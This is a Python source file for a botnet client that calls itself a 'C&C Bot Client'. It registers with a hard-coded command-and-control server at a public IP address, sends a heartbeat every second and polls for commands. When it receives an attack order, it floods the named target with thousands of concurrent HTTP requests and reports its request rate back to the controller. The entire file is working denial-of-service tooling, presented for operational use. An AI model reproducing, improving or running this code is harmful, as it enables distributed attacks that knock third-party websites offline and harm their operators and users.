#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔════════════════════════════════════════════════════════════════════╗
║      Python C&C Bot Client v5.8 - WITH DETAILED LOGGING - FINAL   ║
║  Fixed: Connector Compatibility • Logging • Real-time Tracking    ║
╚════════════════════════════════════════════════════════════════════╝

Author: huynhthienphat
Date: 2025-11-23 15:46:52 UTC
Platform: Multi-OS
"""

import asyncio
import aiohttp
import threading
import time
import sys
import uuid
import urllib3
import os
import socket
import platform
import psutil
import gc
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from pathlib import Path
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============= CONFIG =============
SERVER_URL = "http://103.252.136.208:5000"
BOT_ID = f"BOT-{str(uuid.uuid4())[:8]}"
BOT_NAME = socket.gethostname()
HEARTBEAT_INTERVAL = 1
COMMAND_CHECK_INTERVAL = 1

EXTREME_CONNECTIONS = 2000
BATCH_SIZE = 50
CONNECTION_LIMIT = 2000
TIMEOUT = 1

# ============= LOGGING CONFIG =============
LOG_DIR = Path('./bot_logs')
LOG_DIR.mkdir(exist_ok=True)
LOG_FILE = LOG_DIR / f"{BOT_ID}_activity.log"

attack_stats = {
    'total_sent': 0,
    'total_failed': 0,
    'start_time': None,
    'peak_rps': 0,
    'is_attacking': False,
    'last_synced_sent': 0,
    'last_synced_failed': 0
}

CURRENT_USER = "huynhthienphat"
CURRENT_TIME = "2025-11-23 15:46:52"

class Logger:
    """Custom logger for bot"""
    
    @staticmethod
    def get_timestamp():
        """Get formatted timestamp"""
        return datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    
    @staticmethod
    def log(message, level="INFO"):
        """Log to file and console"""
        timestamp = Logger.get_timestamp()
        log_message = f"[{timestamp}] [{level}] {message}"
        
        # Print to console
        if level == "ERROR":
            print(f"❌ {log_message}")
        elif level == "SUCCESS":
            print(f"✓ {log_message}")
        elif level == "WARNING":
            print(f"⚠️  {log_message}")
        elif level == "SYNC":
            print(f"📡 {log_message}")
        elif level == "ATTACK":
            print(f"🔥 {log_message}")
        else:
            print(f"ℹ️  {log_message}")
        
        # Write to log file
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(log_message + '\n')
        except:
            pass
    
    @staticmethod
    def log_info(message):
        Logger.log(message, "INFO")
    
    @staticmethod
    def log_success(message):
        Logger.log(message, "SUCCESS")
    
    @staticmethod
    def log_error(message):
        Logger.log(message, "ERROR")
    
    @staticmethod
    def log_warning(message):
        Logger.log(message, "WARNING")
    
    @staticmethod
    def log_sync(message):
        Logger.log(message, "SYNC")
    
    @staticmethod
    def log_attack(message):
        Logger.log(message, "ATTACK")

class ExtremeSpeedBot:
    def __init__(self):
        self.running = True
        self.session_requests = self._create_session()
        self.is_attacking = False
        
        Logger.log_info(f"Bot initialized: {BOT_ID}")
    
    def _create_session(self):
        """Create session with retries"""
        session = requests.Session()
        retry = Retry(
            total=3,
            backoff_factor=0.1,
            status_forcelist=(500, 502, 504),
            allowed_methods=["GET", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        Logger.log_success("Session created with retry strategy")
        return session
    
    async def make_request_extreme(self, session, url, sem):
        """Make single request"""
        async with sem:
            try:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=0.5),
                    ssl=False,
                    allow_redirects=False,
                    headers={'User-Agent': 'Mozilla/5.0'}
                ) as resp:
                    _ = resp.status
                    attack_stats['total_sent'] += 1
                    return True
            except asyncio.TimeoutError:
                attack_stats['total_failed'] += 1
            except Exception as e:
                attack_stats['total_failed'] += 1
            return False
    
    async def execute_attack(self, target, threads, total_requests):
        """Execute attack"""
        Logger.log_attack(f"Starting attack to {target}")
        Logger.log_attack(f"Threads: {threads}, Requests: {total_requests:,}")
        
        print(f"\n{'='*70}")
        print(f"🔥 EXECUTING ATTACK")
        print(f"{'='*70}")
        print(f"Target: {target}")
        print(f"Threads: {threads}")
        print(f"Requests: {total_requests:,}")
        print(f"Sync Interval: Every {BATCH_SIZE} requests")
        print(f"{'='*70}\n")
        
        self.is_attacking = True
        attack_stats['is_attacking'] = True
        attack_stats['total_sent'] = 0
        attack_stats['total_failed'] = 0
        attack_stats['last_synced_sent'] = 0
        attack_stats['last_synced_failed'] = 0
        attack_stats['start_time'] = time.time()
        
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        Logger.log_info(f"Normalized target: {target}")
        
        try:
            connector = aiohttp.TCPConnector(
                limit=EXTREME_CONNECTIONS,
                limit_per_host=EXTREME_CONNECTIONS,
                ttl_dns_cache=300,
                enable_cleanup_closed=True,
                backoff_factor=0.01,
                force_close=True
            )
            Logger.log_success("TCP Connector created (with all parameters)")
        except TypeError as e:
            Logger.log_warning(f"TCP Connector error: {e}")
            try:
                connector = aiohttp.TCPConnector(
                    limit=EXTREME_CONNECTIONS,
                    limit_per_host=EXTREME_CONNECTIONS,
                    ttl_dns_cache=300
                )
                Logger.log_success("TCP Connector created (fallback mode)")
            except Exception as e2:
                Logger.log_error(f"Failed to create connector: {e2}")
                return
        
        timeout = aiohttp.ClientTimeout(
            total=TIMEOUT,
            connect=0.5,
            sock_connect=0.3,
            sock_read=0.3
        )
        
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                sem = asyncio.Semaphore(threads)
                
                Logger.log_info(f"Creating {total_requests:,} tasks")
                
                tasks = [
                    self.make_request_extreme(session, target, sem)
                    for _ in range(total_requests)
                ]
                
                Logger.log_info(f"Tasks created. Starting execution with {threads} concurrent...")
                
                print(f"📊 Starting attack with {threads} threads...")
                print(f"📡 Will sync progress to server every {BATCH_SIZE} requests\n")
                
                completed = 0
                last_display = time.time()
                
                for task in asyncio.as_completed(tasks):
                    try:
                        await task
                        completed += 1
                        
                        now = time.time()
                        if now - last_display >= 0.5:
                            elapsed = now - attack_stats['start_time']
                            rps = attack_stats['total_sent'] / elapsed if elapsed > 0 else 0
                            progress = (completed / total_requests * 100)
                            
                            sys.stdout.write(
                                f"\r✓ {completed:,}/{total_requests:,} ({progress:.1f}%) | "
                                f"Sent: {attack_stats['total_sent']:,} | "
                                f"RPS: {rps:,.0f}"
                            )
                            sys.stdout.flush()
                            last_display = now
                        
                        if completed % BATCH_SIZE == 0:
                            delta_sent = attack_stats['total_sent'] - attack_stats['last_synced_sent']
                            delta_failed = attack_stats['total_failed'] - attack_stats['last_synced_failed']
                            
                            if delta_sent > 0 or delta_failed > 0:
                                self.sync_attack_stats(delta_sent, delta_failed)
                            
                            gc.collect()
                    
                    except Exception as e:
                        Logger.log_warning(f"Task error: {e}")
        
        except Exception as e:
            Logger.log_error(f"Attack execution error: {e}")
        
        finally:
            self.is_attacking = False
            attack_stats['is_attacking'] = False
        
        # Final sync
        delta_sent = attack_stats['total_sent'] - attack_stats['last_synced_sent']
        delta_failed = attack_stats['total_failed'] - attack_stats['last_synced_failed']
        
        if delta_sent > 0 or delta_failed > 0:
            Logger.log_sync(f"Final sync: {delta_sent:,} requests")
            self.sync_attack_stats(delta_sent, delta_failed)
        
        elapsed = time.time() - attack_stats['start_time']
        final_rps = attack_stats['total_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"\n\n{'='*70}")
        print(f"✓ ATTACK COMPLETED")
        print(f"{'='*70}")
        print(f"Duration: {elapsed:.2f}s")
        print(f"Total Sent: {attack_stats['total_sent']:,}")
        print(f"Total Failed: {attack_stats['total_failed']:,}")
        print(f"Average RPS: {final_rps:,.0f}")
        print(f"Successfully Synced: {attack_stats['last_synced_sent']:,} to server")
        print(f"{'='*70}\n")
        
        Logger.log_attack(f"Attack completed: {attack_stats['total_sent']:,} sent, {final_rps:,.0f} RPS")
    
    def sync_attack_stats(self, delta_sent, delta_failed):
        """Sync only deltas"""
        try:
            Logger.log_sync(f"Syncing: +{delta_sent:,} requests, +{delta_failed} failed")
            
            response = self.session_requests.post(
                f"{SERVER_URL}/api/track-request",
                json={
                    'botId': BOT_ID,
                    'count': delta_sent,
                    'failed': delta_failed,
                    'total_sent': attack_stats['total_sent'],
                    'total_failed': attack_stats['total_failed']
                },
                timeout=5,
                verify=False
            )
            
            if response.status_code == 200:
                attack_stats['last_synced_sent'] = attack_stats['total_sent']
                attack_stats['last_synced_failed'] = attack_stats['total_failed']
                Logger.log_success(f"Synced: +{delta_sent:,} requests to server")
                print(f"\n✓ Synced: +{delta_sent:,} requests to server")
            else:
                Logger.log_error(f"Sync failed: HTTP {response.status_code}")
                print(f"\n⚠️ Sync failed: {response.status_code}")
        
        except Exception as e:
            Logger.log_error(f"Sync error: {e}")
    
    def check_for_commands(self):
        """Check and execute commands"""
        Logger.log_success("Command listener thread started")
        print("✓ Command listener started\n")
        
        while self.running:
            try:
                response = self.session_requests.post(
                    f"{SERVER_URL}/api/bot/get-command",
                    json={'botId': BOT_ID},
                    timeout=10,
                    verify=False
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    if data.get('hasCommand') == True and data.get('command'):
                        command = data.get('command')
                        
                        if command.get('action') == 'ATTACK':
                            target = command.get('target')
                            threads = command.get('threads', 100)
                            requests_count = command.get('requests', 10000)
                            
                            Logger.log_info(f"Attack command received: {target}")
                            
                            print(f"\n📤 RECEIVED ATTACK COMMAND")
                            print(f"   Target: {target}")
                            print(f"   Threads: {threads}")
                            print(f"   Requests: {requests_count:,}\n")
                            
                            loop = asyncio.new_event_loop()
                            asyncio.set_event_loop(loop)
                            
                            try:
                                loop.run_until_complete(
                                    self.execute_attack(target, threads, requests_count)
                                )
                            except Exception as e:
                                Logger.log_error(f"Attack execution error: {e}")
                                print(f"❌ Attack execution error: {e}")
                            finally:
                                loop.close()
                
                time.sleep(COMMAND_CHECK_INTERVAL)
            
            except Exception as e:
                Logger.log_warning(f"Command check error: {e}")
                time.sleep(COMMAND_CHECK_INTERVAL)
    
    def print_banner(self):
        print(f"""
╔════════════════════════════════════════════════════════════════════╗
║      Python C&C Bot Client v5.8 - WITH LOGGING - FINAL            ║
║  Detailed Logging • Real-time Tracking • Live Monitor             ║
╚════════════════════════════════════════════════════════════════════╝

🤖 Bot Information:
   Name: {BOT_NAME}
   ID: {BOT_ID}
   User: {CURRENT_USER}
   Platform: {platform.system()}

📡 Connection:
   Server: {SERVER_URL}
   Log File: {LOG_FILE}
   Status: Connecting...

⏳ Listening for commands...
🔄 Auto-sync: ENABLED
📝 Detailed Logging: ENABLED
""")
    
    def start(self):
        """Start bot"""
        self.print_banner()
        
        Logger.log_success(f"Bot {BOT_ID} starting")
        Logger.log_info(f"Server: {SERVER_URL}")
        Logger.log_info(f"User: {CURRENT_USER}")
        
        cmd_thread = threading.Thread(target=self.check_for_commands, daemon=False)
        cmd_thread.start()
        
        hb_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        hb_thread.start()
        
        Logger.log_success("All threads started")
        print("✓ Bot started and ready!\n")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            Logger.log_info("Shutdown signal received")
            print("\n\n👋 Shutdown...")
            self.running = False
            cmd_thread.join(timeout=2)
    
    def send_heartbeat(self):
        """Send heartbeat"""
        while self.running:
            try:
                self.session_requests.post(
                    f"{SERVER_URL}/api/bot/heartbeat",
                    json={
                        'botId': BOT_ID,
                        'botName': BOT_NAME,
                        'requests_sent': attack_stats['total_sent'],
                        'requests_failed': attack_stats['total_failed'],
                        'status': 'attacking' if attack_stats['is_attacking'] else 'idle',
                        'peak_rps': attack_stats['peak_rps']
                    },
                    timeout=5,
                    verify=False
                )
            except Exception as e:
                Logger.log_warning(f"Heartbeat failed: {e}")
            
            time.sleep(HEARTBEAT_INTERVAL)

def register_bot():
    """Register bot"""
    print(f"\n{'='*70}")
    print("🔌 Registering Bot...")
    print(f"{'='*70}\n")
    
    Logger.log_info(f"Attempting to register bot: {BOT_ID}")
    
    for attempt in range(5):
        try:
            print(f"[{attempt + 1}/5] Connecting to {SERVER_URL}...")
            Logger.log_info(f"Registration attempt {attempt + 1}/5 to {SERVER_URL}")
            
            response = requests.post(
                f"{SERVER_URL}/api/bot/register",
                json={
                    'botId': BOT_ID,
                    'botName': BOT_NAME
                },
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"✓ Bot registered successfully!")
                print(f"✓ Bot ID: {BOT_ID}")
                print(f"✓ Bot Name: {BOT_NAME}")
                print(f"✓ Ready to receive commands\n")
                
                Logger.log_success(f"Bot registered: {BOT_NAME} ({BOT_ID})")
                Logger.log_success(f"Response: {data.get('message')}")
                return True
            else:
                Logger.log_error(f"Registration failed: HTTP {response.status_code}")
                print(f"⚠️  Server returned: {response.status_code}")
        
        except Exception as e:
            Logger.log_error(f"Connection failed: {e}")
            print(f"❌ Connection failed")
            if attempt < 4:
                print(f"⏳ Retrying in 5 seconds... ({5 - attempt - 1} attempts left)\n")
                time.sleep(5)
    
    Logger.log_error("Bot registration failed after 5 attempts")
    print(f"\n❌ Could not connect to server after 5 attempts")
    return False

def main():
    print(f"\n{'='*70}")
    print("🤖 PYTHON C&C BOT CLIENT v5.8 - WITH LOGGING")
    print(f"{'='*70}")
    print(f"🆔 Bot ID: {BOT_ID}")
    print(f"📝 Bot Name: {BOT_NAME}")
    print(f"👤 User: {CURRENT_USER}")
    print(f"⏰ Time: {CURRENT_TIME} UTC")
    print(f"📡 Server: {SERVER_URL}")
    print(f"📝 Log File: {LOG_FILE}")
    print(f"{'='*70}\n")
    
    Logger.log_success("="*70)
    Logger.log_success("Bot Client v5.8 Started")
    Logger.log_success("="*70)
    Logger.log_info(f"Bot ID: {BOT_ID}")
    Logger.log_info(f"Bot Name: {BOT_NAME}")
    Logger.log_info(f"User: {CURRENT_USER}")
    Logger.log_info(f"Server: {SERVER_URL}")
    
    if register_bot():
        bot = ExtremeSpeedBot()
        bot.start()
    else:
        print("❌ Bot registration failed. Cannot proceed.")
        Logger.log_error("Bot registration failed. Exiting.")
        sys.exit(1)

if __name__ == "__main__":
    main()